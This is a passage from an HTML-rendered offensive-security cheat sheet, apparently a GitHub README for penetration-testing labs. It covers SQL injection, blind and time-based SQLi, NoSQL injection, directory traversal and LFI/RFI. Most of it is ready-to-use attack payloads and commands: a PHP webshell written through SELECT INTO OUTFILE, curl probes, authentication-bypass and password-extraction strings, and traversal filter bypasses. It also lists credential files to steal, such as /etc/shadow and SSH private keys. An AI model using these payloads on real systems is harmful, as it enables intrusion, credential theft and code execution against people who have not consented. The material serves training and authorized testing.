class=\"pl-c\"\u003e--\u003c/span\u003e #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFinally, gather whatever data from the database you desire. Start with understanding the schema:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- getting table schema info\n' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e getting table schema info\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAdditionally, you can get code execution on MySQL by creating a webshell with SELECT INTO OUTFILE:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"' UNION SELECT \u0026quot;\u0026lt;?php system($_GET['cmd']);?\u0026gt;\u0026quot;,null,null,null,null INTO OUTFILE \u0026quot;/var/www/html/tmp/webshell.php\u0026quot; -- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e UNION SELECT \"\u0026lt;?php system($_GET[\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003ecmd\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e]);?\u0026gt;\",null,null,null,null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis requires file write permissions in the database and on disk.\nIt may throw an error when executing the query, but\nthe file can still be written to disk. Check to see.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMySQL and MSSQL have other code execution possibilities as well. Refer to those sections.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.3.2 Blind SQLi\u003c/h4\u003e\u003ca id=\"user-content-2632-blind-sqli\" class=\"anchor\" aria-label=\"Permalink: 2.6.3.2 Blind SQLi\" href=\"#2632-blind-sqli\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTwo types of attack methods: boolean and time-based.\nBoolean requires (visible) change in output on success vs. failure.\nTime-based uses injected sleep on success to detect it.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBoolean:\nUse AND operator to test if pre-condition is true. Base primitive:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' and 1=1 -- #\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' and 1=1 -- #\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen you build out what you know by brute force. Example: given you know 'admin'\nuser is in database, you can build query to determine database name one letter\nat a time, watching for when 'admin' is in output or not:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"# database name 'offsec'\nadmin' and database() like 'o%' and 1=1 -- #  \u0026lt;-- succeeds\nadmin' and database() like 'p%' and 1=1 -- #  \u0026lt;-- fails\n\n# more complex, using binary search for ascii values at each position\nadmin' and substr(database(),2,1)\u0026lt;'f' and 1=1 -- #\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e# database name 'offsec'\nadmin' and database() like 'o%' and 1=1 -- #  \u0026lt;-- succeeds\nadmin' and database() like 'p%' and 1=1 -- #  \u0026lt;-- fails\n\n# more complex, using binary search for ascii values at each position\nadmin' and substr(database(),2,1)\u0026lt;'f' and 1=1 -- #\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTime-based:\nInject sleep call after AND operator that tests if condition is true. Base primitive, causing 3 second sleep on success:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' AND IF (1=1, sleep(3),'false') -- #\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' AND IF (1=1, sleep(3),'false') -- #\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExample (using time utility helps measure difference):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# success is slow (offsec user found in lookup)\n time curl -s \u0026quot;http://192.168.201.16/blindsqli.php?user=$(urlencode \u0026quot;offsec' AND IF (1=1, sleep(1),'false') -- #\u0026quot;)\u0026quot; \u0026amp;\u0026gt; /dev/null\ncurl -s  \u0026amp;\u0026gt; /dev/null  0.02s user 0.00s system 1% cpu 2.258 total\n#                                                     ^^^^^\n\n# failure is fast\n time curl -s \u0026quot;http://192.168.201.16/blindsqli.php?user=$(urlencode \u0026quot;NOPE' AND IF (1=1, sleep(1),'false') -- #\u0026quot;)\u0026quot; \u0026amp;\u0026gt; /dev/null\ncurl -s  \u0026amp;\u0026gt; /dev/null  0.01s user 0.01s system 14% cpu 0.180 total\n#                                                      ^^^^^\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e success is slow (offsec user found in lookup)\u003c/span\u003e\n \u003cspan class=\"pl-k\"\u003etime\u003c/span\u003e curl -s \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://192.168.201.16/blindsqli.php?user=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eurlencode \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eoffsec' AND IF (1=1, sleep(1),'false') -- #\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /dev/null\ncurl -s  \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /dev/null  0.02s user 0.00s system 1% cpu 2.258 total\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e                                                     ^^^^^\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e failure is fast\u003c/span\u003e\n \u003cspan class=\"pl-k\"\u003etime\u003c/span\u003e curl -s \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://192.168.201.16/blindsqli.php?user=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eurlencode \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eNOPE' AND IF (1=1, sleep(1),'false') -- #\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /dev/null\ncurl -s  \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /dev/null  0.01s user 0.01s system 14% cpu 0.180 total\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e                                                      ^^^^^\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.3.3 Exploiting NoSQL Injection\u003c/h4\u003e\u003ca id=\"user-content-2633-exploiting-nosql-injection\" class=\"anchor\" aria-label=\"Permalink: 2.6.3.3 Exploiting NoSQL Injection\" href=\"#2633-exploiting-nosql-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"http://example.com/search?username=admin\u0026amp;password[$ne]=derp\n\n# other short examples:\npassword[$regex]=.*\npassword[$exists]=true\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttp://example.com/search?username=admin\u0026amp;password[$ne]=derp\n\n# other short examples:\npassword[$regex]=.*\npassword[$exists]=true\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn POST body (JSON):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: {\u0026quot;$ne\u0026quot;: null} }\n\n// other examples\n{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: {\u0026quot;$gt\u0026quot;: undefined} }\"\u003e\u003cpre\u003e{\u003cspan class=\"pl-ent\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eadmin\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-ent\"\u003e\"password\"\u003c/span\u003e: {\u003cspan class=\"pl-ent\"\u003e\"$ne\"\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003enull\u003c/span\u003e} }\n\n\u003cspan class=\"pl-ii\"\u003e// other examples\u003c/span\u003e\n{\u003cspan class=\"pl-ent\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eadmin\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-ent\"\u003e\"password\"\u003c/span\u003e: {\u003cspan class=\"pl-ent\"\u003e\"$gt\"\u003c/span\u003e: \u003cspan class=\"pl-ii\"\u003eundefined\u003c/span\u003e} }\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSQL vs Mongo injection:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Normal sql: ' or 1=1-- -\nMongo sql: ' || 1==1//    or    ' || 1==1%00\n\n/?search=admin' \u0026amp;\u0026amp; this.password//+%00 --\u0026gt; Check if the field password exists\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/.*/)//+%00 --\u0026gt; Start matching password\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/^p.*$/)//+%00\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/^pa.*$/)//+%00\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eNormal sql: ' or 1=1-- -\nMongo sql: ' || 1==1//    or    ' || 1==1%00\n\n/?search=admin' \u0026amp;\u0026amp; this.password//+%00 --\u0026gt; Check if the field password exists\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/.*/)//+%00 --\u0026gt; Start matching password\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/^p.*$/)//+%00\n/?search=admin' \u0026amp;\u0026amp; this.password.match(/^pa.*$/)//+%00\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExtracting length information:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"username=admin\u0026amp;password[$regex]=.{1}\nusername=admin\u0026amp;password[$regex]=.{3}\n# True if the length equals 1,3...\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eusername=admin\u0026amp;password[$regex]=.{1}\nusername=admin\u0026amp;password[$regex]=.{3}\n# True if the length equals 1,3...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBuilding password:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"username=admin\u0026amp;password[$regex]=p.*\nusername=admin\u0026amp;password[$regex]=pa.*\nusername=admin\u0026amp;password[$regex]=pas.*\nusername=admin\u0026amp;password[$regex]=pass.*\n...\n# in JSON\n{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: {\u0026quot;$regex\u0026quot;: \u0026quot;^p\u0026quot; }}\n{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: {\u0026quot;$regex\u0026quot;: \u0026quot;^pa\u0026quot; }}\n{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: {\u0026quot;$regex\u0026quot;: \u0026quot;^pas\u0026quot; }}\n...\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eusername=admin\u0026amp;password[$regex]=p.*\nusername=admin\u0026amp;password[$regex]=pa.*\nusername=admin\u0026amp;password[$regex]=pas.*\nusername=admin\u0026amp;password[$regex]=pass.*\n...\n# in JSON\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^p\" }}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^pa\" }}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^pas\" }}\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.4 Directory Traversal\u003c/h3\u003e\u003ca id=\"user-content-264-directory-traversal\" class=\"anchor\" aria-label=\"Permalink: 2.6.4 Directory Traversal\" href=\"#264-directory-traversal\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOn Linux, \u003ccode\u003e/var/www/html/\u003c/code\u003e is commonly the webroot. Other Linux options: \u003ccode\u003e/usr/share/nginx/www\u003c/code\u003e or \u003ccode\u003e/usr/share/nginx/html\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOn Windows IIS, it's \u003ccode\u003eC:\\inetpub\\wwwroot\\\u003c/code\u003e. For Windows XAMPP, it's \u003ccode\u003eC:\\xampp\\htdocs\\\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eSometimes you can read \u003ca href=\"#sensitive-files\"\u003esensitive files\u003c/a\u003e by changing the URL query params to point\nto a file using the relative path.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eExample:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"https://example.com/cms/login.php?language=en.html\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttps://example.com/cms/login.php?language=en.html\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere, \u003ccode\u003een.html\u003c/code\u003e appears to be a file in the \u003ccode\u003e/cms/\u003c/code\u003e directory under the webroot.\nWe can try changing \u003ccode\u003een.html\u003c/code\u003e to \u003ccode\u003e../../../../etc/passwd\u003c/code\u003e to see if it lets us\nview the file.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThings to try when testing for traversal vuln:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eAdd extra \u003ccode\u003e../\u003c/code\u003e to ensure you make it all the way to the filesystem root.\u003c/li\u003e\n\u003cli\u003eUse backslashes (\u003ccode\u003e\\\u003c/code\u003e) instead of forward slashes (\u003ccode\u003e/\u003c/code\u003e), especially on Windows.\u003c/li\u003e\n\u003cli\u003eURL encode the \u003ccode\u003e../\u003c/code\u003e -\u0026gt; \u003ccode\u003e%2E%2E%2F\u003c/code\u003e to bypass filters\u003c/li\u003e\n\u003cli\u003eDouble-encode the \u003ccode\u003e../\u003c/code\u003e -\u0026gt; \u003ccode\u003e%252E%252E%252F\u003c/code\u003e; IIS 5.0 and earlier\u003c/li\u003e\n\u003cli\u003eUTF-8 encode the \u003ccode\u003e../\u003c/code\u003e -\u0026gt; \u003ccode\u003e%C0%AE%C0%AE%2F\u003c/code\u003e (\u003ccode\u003e%c0%ae\u003c/code\u003e is \u003ccode\u003e.\u003c/code\u003e); \u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744\" rel=\"nofollow\"\u003ecve-2022-1744\u003c/a\u003e{:target=\"_blank\"}\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e....//\u003c/code\u003e instead of \u003ccode\u003e../\u003c/code\u003e to bypass filters\u003c/li\u003e\n\u003cli\u003eAppend null byte (\u003ccode\u003e%00\u003c/code\u003e) if you suspect file extension is getting added\u003c/li\u003e\n\u003cli\u003eCheck out \u003ca href=\"https://github.com/wireghoul/dotdotpwn\"\u003eDotDotPwn\u003c/a\u003e fuzzing tool.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eWhen using \u003ccode\u003ecurl\u003c/code\u003e to test, you may need to include the \u003ccode\u003e--path-as-is\u003c/code\u003e flag:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"curl --path-as-is http://localhost/?page=/../../../../etc/passwd\"\u003e\u003cpre\u003ecurl --path-as-is http://localhost/\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003epage=/../../../../etc/passwd\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFiles to try:\u003c/strong\u003e\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/etc/shadow\u003c/code\u003e if permissions allow\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\Windows\\System32\\drivers\\etc\\hosts\u003c/code\u003e - good to test traversal vuln\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.ssh/id_rsa\u003c/code\u003e files under user home dir (after seeing in \u003ccode\u003e/etc/passwd\u003c/code\u003e)\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003ealso \u003ccode\u003eid_dsa\u003c/code\u003e, \u003ccode\u003eid_ecdsa\u003c/code\u003e, and \u003ccode\u003eid_ed25519\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eother \u003ca href=\"#7.1%20Sensitive%20Files\"\u003esensitive files\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003eproc\u003c/code\u003e filesystem has useful info for enumerating the host:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug  # Can be used to see what processes the machine is running\n/proc/mounts\n/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/net/fib_trie\n/proc/[0-9]*/fd/[0-9]*  # (first number is the PID, second is the file descriptor)\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug  # Can be used to see what processes the machine is running\n/proc/mounts\n/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/net/fib_trie\n/proc/[0-9]*/fd/[0-9]*  # (first number is the PID, second is the file descriptor)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf there is arbitrary file upload (allows directory traversal), you may be able\nto use it to (over)write arbitrary files, which may help you get code execution.\nTry:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003euploading a webshell to the webroot folder\u003c/li\u003e\n\u003cli\u003eadding your ssh key to the \u003ccode\u003eauthorized_keys\u003c/code\u003e file\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.5 LFI/RFI\u003c/h3\u003e\u003ca id=\"user-content-265-lfirfi\" class=\"anchor\" aria-label=\"Permalink: 2.6.5 LFI/RFI\" href=\"#265-lfirfi\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eLocal File Inclusion is basically code execution that requires directory traversal.\nLFI/RFI can be leveraged with PHP (\u003ccode\u003e.php\u003c/code\u003e, most common), Perl (\u003ccode\u003e.pl\u003c/code\u003e), Active\nServer Pages (\u003ccode\u003e.asp\u003c/code\u003e), Active Server Pages Extended (\u003ccode\u003e.aspx\u003c/code\u003e), Java Server\nPages (\u003ccode\u003e.jsp\u003c/code\u003e), and even (rarely) Node.js.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf there is a file upload vulnerability, you can also combine LFI with that to\nget code execution.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFile Upload filter bypasses:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003echange file extension to \u003ccode\u003e.phps\u003c/code\u003e or \u003ccode\u003e.php7\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003emake file extension mixed uppercase and lowercase\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eYou can get code execution by poisoning local files, including log files and\nPHP session files with PHP code. Access logs typically have User-Agent in them,\nwhich we can use to inject malicious PHP code.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCommon log and PHP session file locations:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/apache2/access.log\u003c/code\u003e - Debian/Ubuntu\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/apache2/access.log\u003c/code\u003e - RHEL/CentOS/Fedora\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/httpd-access.log\u003c/code\u003e - FreeBSD\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\xampp\\apache\\logs\\access.log\u003c/code\u003e - Windows w/ XAMPP\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\Program Files\\Apache Group\\Apache\\logs\\access.log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\inetpub\\logs\\LogFiles\\W3SVC1\\\u003c/code\u003e and \u003ccode\u003e\\HTTPERR\\\u003c/code\u003e - Windows IIS\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/etc/httpd/logs/acces_log\u003c/code\u003e and \u003ccode\u003e/error_log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/www/logs/access_log\u003c/code\u003e and \u003ccode\u003e/error_log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/www/logs/access.log\u003c/code\u003e and \u003ccode\u003e/error.log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\Windows\\Temp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/tmp/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/lib/php/session\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/lib/php[4567]/session\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\php\\sessions\\\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC:\\php[4567]\\sessions\\\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eDefault session filename: \u003ccode\u003esess_\u0026lt;SESSION_ID\u0026gt;\u003c/code\u003e\n(grab SESSION_ID from your cookies in the browser)\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eLook for \u003ca href=\"#sensitive-files\"\u003esensitive files\u003c/a\u003e if you have LFI!\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFor RFI, the \u003ccode\u003eallow_url_include\u003c/code\u003e must be enabled in PHP apps.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" 